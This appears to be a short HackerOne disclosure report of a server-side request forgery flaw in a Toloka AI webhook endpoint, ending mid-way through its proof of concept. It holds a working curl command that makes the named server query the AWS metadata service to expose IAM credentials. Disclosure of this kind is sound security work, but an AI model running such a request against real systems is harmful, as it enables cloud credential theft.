# Critical SSRF Vulnerability in Toloka AI

**Report ID:** #3090616  
**Disclosed via:** HackerOne  
**Researcher:** [@elyasroot](https://hackerone.com/elyasroot)  
**Impact:** AWS metadata exposure & IAM credential leakage (CVSS: 9.1)  

---

## Summary

A critical Server-Side Request Forgery (SSRF) vulnerability was discovered in the `/webhook` endpoint of `framer-components.toloka.cloud`, allowing unauthenticated attackers to query internal AWS metadata services and extract sensitive information, including IAM credentials.

---

## Proof of Concept (PoC)

```bash
curl -i "https://framer-components.toloka.cloud/webhook?url=http://169.254.169.254/latest/meta-data"
